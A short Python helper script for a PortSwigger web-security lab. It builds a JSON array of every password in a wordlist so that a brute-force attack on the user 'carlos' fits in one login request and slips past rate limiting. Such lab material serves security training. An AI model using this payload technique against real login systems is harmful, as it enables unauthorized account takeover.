# https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request
# Sending multiple request in one request

import urllib3
import json
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def bruteForce(url):

    username = "carlos"

    print("[ + ] Generating request for user %s...\n" % (username))


    passwords = "["
    
    passwordFile = open('passwords.txt', 'r')
    linesUsername = passwordFile.read().splitlines()

    for line in linesUsername:
        passwords += '"' + line + '",'

    # Removing last string (comma)
    passwords = passwords[:-1]
    passwords += "]"

    print("Copy your password payload below or get the full request in your proxy!")

    print('\n' + passwords)
        
            
def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    bruteForce(url)

if __name__ == "__main__":
    main() 
